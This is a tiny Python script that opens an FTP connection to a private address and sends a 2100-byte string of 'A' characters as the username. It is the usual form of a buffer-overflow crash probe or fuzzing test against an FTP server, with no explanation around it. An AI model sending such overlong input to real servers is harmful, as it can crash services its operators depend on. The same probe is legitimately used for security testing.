import ftplib
buffer="A" * 2100
ftp = ftplib.FTP('192.168.0.1', buffer, 'test')
